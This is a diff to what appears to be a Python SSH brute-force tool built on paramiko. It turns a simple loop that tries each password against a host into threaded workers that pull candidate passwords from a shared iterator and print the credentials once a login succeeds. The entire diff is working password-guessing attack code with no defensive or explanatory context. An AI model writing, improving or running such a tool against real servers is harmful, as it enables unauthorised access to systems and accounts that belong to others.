@@ -38,22 +38,24 @@ event_done = threading.Event()
 trueuser = None
 truepasswd = None
 
-
-
-
-client = paramiko.SSHClient()
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-for password in passwords:
-
-    try:
-        client.connect(hostname=host, username=user , password=password, timeout=3)
-        print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
-        print("===========================================================================\n")
-        print(" The Password was Found and Connection was Success\n")
-        print(f"Connect with {host}  as   {user}  :   {password}\n")
-
-        break
-
-    except Exception as e:
-        print(f" the connnection was failed with {host}  ")
+def workers():
+    global trueuser, truepasswd
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    while not event_done.is_set():
+        try:
+            password = next(iter_passwords)
+        except StopIteration:
+            break
+        
+        try:
+            client.connect(hostname=host, username=user , password=password, timeout=3)
+            print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
+            print("===========================================================================\n")
+            print(" The Password was Found and Connection was Success\n")
+            print(f"Connect with {host}  as   {user}  :   {password}\n")
+    
+            break
+        
+        except Exception as e:
+            print(f" the connnection was failed with {host}  ")
